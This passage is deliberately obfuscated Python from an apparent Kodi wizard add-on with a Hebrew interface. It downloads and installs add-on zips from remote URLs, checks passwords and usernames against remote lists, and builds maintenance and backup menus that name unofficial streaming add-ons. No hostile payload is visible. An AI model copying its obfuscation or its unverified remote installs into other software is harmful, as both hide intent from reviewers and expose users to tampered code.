			O000OOOOOOO0OOOOO =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OO0OO0O0O0000O0OO ).findall (O000OOO000O00O000 )#line:2520
			if len (O000OOOOOOO0OOOOO )>0 :#line:2521
				for O0O0O000OO0O0OO0O ,O0000O0OOO0O000OO ,O0OOOOO0O00O00000 ,O000O000OOO00OOO0 ,O00000O00OOOO0O00 ,OO0O00O00OOOOOO00 ,O0OO0O0O0000000O0 ,OO0000OOOOO0O00OO ,O0OOO000OOO00OO0O in O000OOOOOOO0OOOOO :#line:2522
					if os .path .exists (os .path .join (ADDONS ,OO0OO0O0O0000O0OO )):#line:2523
						OO0OOOO0OO0O0O0OO =['Launch Addon','Remove Addon']#line:2524
						O0OO00O000000O000 =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,OO0OOOO0OO0O0O0OO )#line:2525
						if O0OO00O000000O000 ==0 :#line:2526
							wiz .ebi ('RunAddon(%s)'%OO0OO0O0O0000O0OO )#line:2527
							xbmc .sleep (1000 )#line:2528
							return True #line:2529
						elif O0OO00O000000O000 ==1 :#line:2530
							wiz .cleanHouse (os .path .join (ADDONS ,OO0OO0O0O0000O0OO ))#line:2531
							try :wiz .removeFolder (os .path .join (ADDONS ,OO0OO0O0O0000O0OO ))#line:2532
							except :pass #line:2533
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,OO0OO0O0O0000O0OO ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2534
								removeAddonData (OO0OO0O0O0000O0OO )#line:2535
							wiz .refresh ()#line:2536
							return True #line:2537
						else :#line:2538
							return False #line:2539
					O00O0OO0OOO000000 =os .path .join (ADDONS ,O0OOOOO0O00O00000 )#line:2540
					if not O0OOOOO0O00O00000 .lower ()=='none'and not os .path .exists (O00O0OO0OOO000000 ):#line:2541
						wiz .log ("Repository not installed, installing it")#line:2542
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,OO0OO0O0O0000O0OO ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O0OOOOO0O00O00000 ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2543
							O0O0O00000OOOO00O =wiz .parseDOM (wiz .openURL (O000O000OOO00OOO0 ),'addon',ret ='version',attrs ={'id':O0OOOOO0O00O00000 })#line:2544
							if len (O0O0O00000OOOO00O )>0 :#line:2545
								OOOO0O0O0O000OO00 ='%s%s-%s.zip'%(O00000O00OOOO0O00 ,O0OOOOO0O00O00000 ,O0O0O00000OOOO00O [0 ])#line:2546
								wiz .log (OOOO0O0O0O000OO00 )#line:2547
								if KODIV >=17 :wiz .addonDatabase (O0OOOOO0O00O00000 ,1 )#line:2548
								installAddon (O0OOOOO0O00O00000 ,OOOO0O0O0O000OO00 )#line:2549
								wiz .ebi ('UpdateAddonRepos()')#line:2550
								wiz .log ("Installing Addon from Kodi")#line:2552
								OO0O00OOO0OO0O0O0 =installFromKodi (OO0OO0O0O0000O0OO )#line:2553
								wiz .log ("Install from Kodi: %s"%OO0O00OOO0OO0O0O0 )#line:2554
								if OO0O00OOO0OO0O0O0 :#line:2555
									wiz .refresh ()#line:2556
									return True #line:2557
							else :#line:2558
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%O0OOOOO0O00O00000 )#line:2559
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(OO0OO0O0O0000O0OO ,O0OOOOO0O00O00000 ))#line:2560
					elif O0OOOOO0O00O00000 .lower ()=='none':#line:2561
						wiz .log ("No repository, installing addon")#line:2562
						O0OOOO0OO0000000O =OO0OO0O0O0000O0OO #line:2563
						O0OO0O0000OO0O0OO =O0000O0OOO0O000OO #line:2564
						installAddon (OO0OO0O0O0000O0OO ,O0000O0OOO0O000OO )#line:2565
						wiz .refresh ()#line:2566
						return True #line:2567
					else :#line:2568
						wiz .log ("Repository installed, installing addon")#line:2569
						OO0O00OOO0OO0O0O0 =installFromKodi (OO0OO0O0O0000O0OO ,False )#line:2570
						if OO0O00OOO0OO0O0O0 :#line:2571
							wiz .refresh ()#line:2572
							return True #line:2573
					if os .path .exists (os .path .join (ADDONS ,OO0OO0O0O0000O0OO )):return True #line:2574
					OO0O00O0O00000O00 =wiz .parseDOM (wiz .openURL (O000O000OOO00OOO0 ),'addon',ret ='version',attrs ={'id':OO0OO0O0O0000O0OO })#line:2575
					if len (OO0O00O0O00000O00 )>0 :#line:2576
						O0000O0OOO0O000OO ="%s%s-%s.zip"%(O0000O0OOO0O000OO ,OO0OO0O0O0000O0OO ,OO0O00O0O00000O00 [0 ])#line:2577
						wiz .log (str (O0000O0OOO0O000OO ))#line:2578
						if KODIV >=17 :wiz .addonDatabase (OO0OO0O0O0000O0OO ,1 )#line:2579
						installAddon (OO0OO0O0O0000O0OO ,O0000O0OOO0O000OO )#line:2580
						wiz .refresh ()#line:2581
					else :#line:2582
						wiz .log ("no match");return False #line:2583
			else :wiz .log ("[Addon Installer] Invalid Format")#line:2584
		else :wiz .log ("[Addon Installer] Text File: %s"%OOO0000O0O00O0OO0 )#line:2585
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:2586
def installFromKodi (O0OOOO0O0O00OO0OO ,over =True ):#line:2588
	if over ==True :#line:2589
		xbmc .sleep (2000 )#line:2590
	wiz .ebi ('RunPlugin(plugin://%s)'%O0OOOO0O0O00OO0OO )#line:2592
	if not wiz .whileWindow ('yesnodialog'):#line:2593
		return False #line:2594
	xbmc .sleep (1000 )#line:2595
	if wiz .whileWindow ('okdialog'):#line:2596
		return False #line:2597
	wiz .whileWindow ('progressdialog')#line:2598
	if os .path .exists (os .path .join (ADDONS ,O0OOOO0O0O00OO0OO )):return True #line:2599
	else :return False #line:2600
def installAddon (O00OOO00O00O000O0 ,OO0OO0O000O000O0O ):#line:2602
	if not wiz .workingURL (OO0OO0O000O000O0O )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,O00OOO00O00O000O0 ,COLOR2 ));return #line:2603
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2604
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OOO00O00O000O0 ),'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2605
	O0O00O0OO0000O000 =OO0OO0O000O000O0O .split ('/')#line:2606
	OOO0OOOOO000O0OOO =os .path .join (PACKAGES ,O0O00O0OO0000O000 [-1 ])#line:2607
	try :os .remove (OOO0OOOOO000O0OOO )#line:2608
	except :pass #line:2609
	downloader .download (OO0OO0O000O000O0O ,OOO0OOOOO000O0OOO ,DP )#line:2610
	O00OO00000OOOO000 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OOO00O00O000O0 )#line:2611
	DP .update (0 ,O00OO00000OOOO000 ,'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2612
	OO0OO0O000O0000OO ,O0000O0OOO0O0O0OO ,O0O00000OOOOOOO00 =extract .all (OOO0OOOOO000O0OOO ,ADDONS ,DP ,title =O00OO00000OOOO000 )#line:2613
	DP .update (0 ,O00OO00000OOOO000 ,'','[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:2614
	installed (O00OOO00O00O000O0 )#line:2615
	installDep (O00OOO00O00O000O0 ,DP )#line:2616
	DP .close ()#line:2617
	wiz .ebi ('UpdateAddonRepos()')#line:2618
	wiz .ebi ('UpdateLocalAddons()')#line:2619
	wiz .refresh ()#line:2620
def installDep (O0OO000O0OOO0000O ,DP =None ):#line:2622
	O0O00O0000O000000 =os .path .join (ADDONS ,O0OO000O0OOO0000O ,'addon.xml')#line:2623
	if os .path .exists (O0O00O0000O000000 ):#line:2624
		O00O0OO0O00O0OOO0 =open (O0O00O0000O000000 ,mode ='r');OOO0OO0OO0OOO00O0 =O00O0OO0O00O0OOO0 .read ();O00O0OO0O00O0OOO0 .close ();#line:2625
		OO0OOO00OO0OOOOOO =wiz .parseDOM (OOO0OO0OO0OOO00O0 ,'import',ret ='addon')#line:2626
		for O000O0O0000O00O00 in OO0OOO00OO0OOOOOO :#line:2627
			if not 'xbmc.python'in O000O0O0000O00O00 :#line:2628
				if not DP ==None :#line:2629
					DP .update (0 ,'','[COLOR %s]%s[/COLOR]'%(COLOR1 ,O000O0O0000O00O00 ))#line:2630
				wiz .createTemp (O000O0O0000O00O00 )#line:2631
def installed (OO0OO0O0O0O0O000O ):#line:2658
	O000OO00OOO000O0O =os .path .join (ADDONS ,OO0OO0O0O0O0O000O ,'addon.xml')#line:2659
	if os .path .exists (O000OO00OOO000O0O ):#line:2660
		try :#line:2661
			O00OO00OOO0000O00 =open (O000OO00OOO000O0O ,mode ='r');OO0OOOOOO0O0000OO =O00OO00OOO0000O00 .read ();O00OO00OOO0000O00 .close ()#line:2662
			OO00O0OO000O0OOOO =wiz .parseDOM (OO0OOOOOO0O0000OO ,'addon',ret ='name',attrs ={'id':OO0OO0O0O0O0O000O })#line:2663
			OOO0OOO00O0O00O0O =os .path .join (ADDONS ,OO0OO0O0O0O0O000O ,'icon.png')#line:2664
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO00O0OO000O0OOOO [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',OOO0OOO00O0O00O0O )#line:2665
		except :pass #line:2666
def youtubeMenu (url =None ):#line:2668
	if not YOUTUBEFILE =='http://':#line:2669
		if url ==None :#line:2670
			O0000OOOO00O0OOOO =wiz .workingURL (YOUTUBEFILE )#line:2671
			OOOOO000O000OO00O =uservar .YOUTUBEFILE #line:2672
		else :#line:2673
			O0000OOOO00O0OOOO =wiz .workingURL (url )#line:2674
			OOOOO000O000OO00O =url #line:2675
		if O0000OOOO00O0OOOO ==True :#line:2676
			OOO000O000O000000 =wiz .openURL (OOOOO000O000OO00O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2677
			O000O0O0O000OO00O =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (OOO000O000O000000 )#line:2678
			if len (O000O0O0O000OO00O )>0 :#line:2679
				for OO0O000OO000O0O0O ,O000O00000OO00O00 ,url ,O000O000O0O0OOO00 ,O000O0O0OOOOOOOO0 ,OOOO0OOO00OO0O0O0 in O000O0O0O000OO00O :#line:2680
					if O000O00000OO00O00 .lower ()=="yes":#line:2681
						addDir ("[B]%s[/B]"%OO0O000OO000O0O0O ,'youtube',url ,description =OOOO0OOO00OO0O0O0 ,icon =O000O000O0O0OOO00 ,fanart =O000O0O0OOOOOOOO0 ,themeit =THEME3 )#line:2682
					else :#line:2683
						addFile (OO0O000OO000O0O0O ,'viewVideo',url =url ,description =OOOO0OOO00OO0O0O0 ,icon =O000O000O0O0OOO00 ,fanart =O000O0O0OOOOOOOO0 ,themeit =THEME2 )#line:2684
			else :wiz .log ("[YouTube Menu] ERROR: Invalid Format.")#line:2685
		else :#line:2686
			wiz .log ("[YouTube Menu] ERROR: URL for YouTube list not working.")#line:2687
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2688
			addFile ('%s'%O0000OOOO00O0OOOO ,'',themeit =THEME3 )#line:2689
	else :wiz .log ("[YouTube Menu] No YouTube list added.")#line:2690
	setView ('files','viewType')#line:2691
def STARTP ():#line:2692
	OOO000O00OOOO0O00 =(ADDON .getSetting ("pass"))#line:2693
	if BUILDNAME =="":#line:2694
	 if not NOTIFY =='true':#line:2695
          OOO0O000OO0O00OO0 =wiz .workingURL (NOTIFICATION )#line:2696
	 if not NOTIFY2 =='true':#line:2697
          OOO0O000OO0O00OO0 =wiz .workingURL (NOTIFICATION2 )#line:2698
	 if not NOTIFY3 =='true':#line:2699
          OOO0O000OO0O00OO0 =wiz .workingURL (NOTIFICATION3 )#line:2700
	OO00O0O0O0OO00O00 =OOO000O00OOOO0O00 #line:2701
	OOO0O000OO0O00OO0 =urllib2 .Request (SPEED )#line:2702
	O00OOO000OO000OOO =urllib2 .urlopen (OOO0O000OO0O00OO0 )#line:2703
	O0000OOO0O0O000OO =O00OOO000OO000OOO .readlines ()#line:2705
	OOO000OO0O0OOO00O =0 #line:2709
	for O0O00OO0000OOOO0O in O0000OOO0O0O000OO :#line:2710
		if O0O00OO0000OOOO0O .split (' ==')[0 ]==OOO000O00OOOO0O00 or O0O00OO0000OOOO0O .split ()[0 ]==OOO000O00OOOO0O00 :#line:2711
			OOO000OO0O0OOO00O =1 #line:2712
			break #line:2713
	if OOO000OO0O0OOO00O ==0 :#line:2714
					O0OO0OOOOO00O0O0O =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]הסיסמה אינה נכונה,"%(COLOR2 ),"הכנס את הסיסמה כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2715
					if O0OO0OOOOO00O0O0O :#line:2717
						ADDON .openSettings ()#line:2719
						sys .exit ()#line:2721
					else :#line:2722
						sys .exit ()#line:2723
	return 'ok'#line:2727
def STARTP2 ():#line:2728
	OO0OO0O00OO00O00O =(ADDON .getSetting ("user"))#line:2729
	OOO0OOOO000O000OO =(UNAME )#line:2731
	OOO00O0O0O00O0O00 =urllib2 .urlopen (OOO0OOOO000O000OO )#line:2732
	OOO0OOOO0000OO000 =OOO00O0O0O00O0O00 .readlines ()#line:2733
	O000O000000000OOO =0 #line:2734
	for OO00O00OOO00OOOO0 in OOO0OOOO0000OO000 :#line:2737
		if OO00O00OOO00OOOO0 .split (' ==')[0 ]==OO0OO0O00OO00O00O or OO00O00OOO00OOOO0 .split ()[0 ]==OO0OO0O00OO00O00O :#line:2738
			O000O000000000OOO =1 #line:2739
			break #line:2740
	if O000O000000000OOO ==0 :#line:2741
		O000000OOOO0OO0O0 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]שם המתשמש שהוכנס אינו נכון,"%(COLOR2 ),"הכנס את שם המשתמש כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2742
		if O000000OOOO0OO0O0 :#line:2744
			ADDON .openSettings ()#line:2746
			sys .exit ()#line:2749
		else :#line:2750
			sys .exit ()#line:2751
	return 'ok'#line:2755
def passandpin ():#line:2756
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:2757
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:2758
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:2759
def passandUsername ():#line:2760
	ADDON .openSettings ()#line:2761
def folderback ():#line:2764
    O000000O0000OO0O0 =ADDON .getSetting ("path")#line:2765
    if O000000O0000OO0O0 :#line:2766
      O000000O0000OO0O0 =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:2767
      ADDON .setSetting ("path",O000000O0000OO0O0 )#line:2768
def backmyupbuild ():#line:2771
		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2775
		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2776
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2777
		addFile ('גיבוי הגדרות סקין ותפריטים בלבד','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2779
		addFile ('גיבוי הגדרות של הרחבות כולל תפריטים וסיסמאות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2780
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2781
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2783
def maintMenu (view =None ):#line:2787
	O000O00O00OOOO0O0 ='[B][COLOR green]ON[/COLOR][/B]';OO000O0OOO00OO00O ='[B][COLOR red]OFF[/COLOR][/B]'#line:2789
	O00OO00O0O0OO0OO0 ='true'if AUTOCLEANUP =='true'else 'false'#line:2790
	OOO0000O00000O0OO ='true'if AUTOCACHE =='true'else 'false'#line:2791
	OOO0O00000O000O0O ='true'if AUTOPACKAGES =='true'else 'false'#line:2792
	OO00000OO0OO000OO ='true'if AUTOTHUMBS =='true'else 'false'#line:2793
	O0O000OOOO00OO0O0 ='true'if SHOWMAINT =='true'else 'false'#line:2794
	O0O0OOOOO00O0O000 ='true'if INCLUDEVIDEO =='true'else 'false'#line:2795
	O0OOO000000O0O0OO ='true'if INCLUDEALL =='true'else 'false'#line:2796
	OO000O000OOOO0000 ='true'if THIRDPARTY =='true'else 'false'#line:2797
	if wiz .Grab_Log (True )==False :O0000O0000O0OO0O0 =0 #line:2798
	else :O0000O0000O0OO0O0 =errorChecking (wiz .Grab_Log (True ),True ,True )#line:2799
	if wiz .Grab_Log (True ,True )==False :O0O00O000O0O0OO00 =0 #line:2800
	else :O0O00O000O0O0OO00 =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:2801
	OOOOOOO0OOO00OO00 =int (O0000O0000O0OO0O0 )+int (O0O00O000O0O0OO00 )#line:2802
	OO0OOOO00000OOOO0 =str (OOOOOOO0OOO00OO00 )+' Error(s) Found'if OOOOOOO0OOO00OO00 >0 else 'None Found'#line:2803
	O0O0O000O000O000O =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:2804
	if O0OOO000000O0O0OO =='true':#line:2805
		O0O000O00000O0000 ='true'#line:2806
		OO0OOO0OO0000OOO0 ='true'#line:2807
		OOOOO0OOOOO0O0OOO ='true'#line:2808
		O0O0OO0000O0OO00O ='true'#line:2809
		O00OO0O00O00O0O00 ='true'#line:2810
		O0OOOOOO000OOO00O ='true'#line:2811
		O0OO00O000OOOO0O0 ='true'#line:2812
		O0OOO0OOOO0O0OO0O ='true'#line:2813
	else :#line:2814
		O0O000O00000O0000 ='true'if INCLUDEBOB =='true'else 'false'#line:2815
		OO0OOO0OO0000OOO0 ='true'if INCLUDEPHOENIX =='true'else 'false'#line:2816
		OOOOO0OOOOO0O0OOO ='true'if INCLUDESPECTO =='true'else 'false'#line:2817
		O0O0OO0000O0OO00O ='true'if INCLUDEGENESIS =='true'else 'false'#line:2818
		O00OO0O00O00O0O00 ='true'if INCLUDEEXODUS =='true'else 'false'#line:2819
		O0OOOOOO000OOO00O ='true'if INCLUDEONECHAN =='true'else 'false'#line:2820
		O0OO00O000OOOO0O0 ='true'if INCLUDESALTS =='true'else 'false'#line:2821
		O0OOO0OOOO0O0OO0O ='true'if INCLUDESALTSHD =='true'else 'false'#line:2822
	O0O0O000OO00OO000 =wiz .getSize (PACKAGES )#line:2823
	O00O00OOO0000O0OO =wiz .getSize (THUMBS )#line:2824
	OO0OO00O0OOOO0O00 =wiz .getCacheSize ()#line:2825
	OOO0O000OO0OOO0OO =O0O0O000OO00OO000 +O00O00OOO0000O0OO +OO0OO00O0OOOO0O00 #line:2826
	O0O0OO0000O00OOO0 =['Daily','Always','3 Days','Weekly']#line:2827
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:2828
	if view =="clean"or SHOWMAINT =='true':#line:2829
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OOO0O000OO0OOO0OO ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:2830
		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO0OO00O0OOOO0O00 ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2831
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0O0O000OO00OO000 ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2832
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O00O00OOO0000O0OO ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:2833
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2834
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:2835
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:2836
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:2837
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:2838
	if view =="addon"or SHOWMAINT =='false':#line:2839
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2840
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:2841
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2842
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:2843
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2844
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2845
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2846
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:2847
	if view =="misc"or SHOWMAINT =='true':#line:2848
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:2849
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:2850
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:2851
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:2852
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:2853
		addFile ('View Errors in Log: %s'%(OO0OOOO00000OOOO0 ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:2854
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:2855
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2856
		addFile ('Clear Wizard Log File%s'%O0O0O000O000O000O ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2857
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:2858
	if view =="backup"or SHOWMAINT =='true':#line:2859
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2860
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2861
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2862
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:2863
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2864
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2865
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2866
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:2867
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2868
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:2869
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:2870
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2871
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:2872
	if view =="tweaks"or SHOWMAINT =='true':#line:2873
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:2874
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:2875
		else :#line:2876
			if os .path .exists (ADVANCED ):#line:2877
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2878
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2879
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2880
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:2881
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:2882
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2883
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:2884
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:2885
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:2886
	addFile ('Show All Maintenance: %s'%O0O000OOOO00OO0O0 .replace ('true',O000O00O00OOOO0O0 ).replace ('false',OO000O0OOO00OO00O ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:2887
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:2888
	addFile ('Third Party Wizards: %s'%OO000O000OOOO0000 .replace ('true',O000O00O00OOOO0O0 ).replace ('false',OO000O0OOO00OO00O ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2889
	if OO000O000OOOO0000 =='true':#line:2890
		OOOO00OO0000O00O0 =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:2891
		O00OO000O000OOO0O =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:2892
		O0O00OO0000O00000 =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:2893
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OOOO00OO0000O00O0 ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:2894
		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O00OO000O000OOO0O ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:2895
		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O0O00OO0000O00000 ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:2896
	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2897
	addFile ('ניקוי אוטומטי בהפעלה: %s'%O00OO00O0O0OO0OO0 .replace ('true',O000O00O00OOOO0O0 ).replace ('false',OO000O0OOO00OO00O ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:2898
	if O00OO00O0O0OO0OO0 =='true':#line:2899
		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%O0O0OO0000O00OOO0 [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:2900
		addFile ('--- ניקוי קאש בהפעלה: %s'%OOO0000O00000O0OO .replace ('true',O000O00O00OOOO0O0 ).replace ('false',OO000O0OOO00OO00O ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2901
		addFile ('--- ניקוי חבילות בהפעלה: %s'%OOO0O00000O000O0O .replace ('true',O000O00O00OOOO0O0 ).replace ('false',OO000O0OOO00OO00O ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2902
		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%OO00000OO0OO000OO .replace ('true',O000O00O00OOOO0O0 ).replace ('false',OO000O0OOO00OO00O ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2903
	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2904
	addFile ('Include Video Cache in Clear Cache: %s'%O0O0OOOOO00O0O000 .replace ('true',O000O00O00OOOO0O0 ).replace ('false',OO000O0OOO00OO00O ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:2905
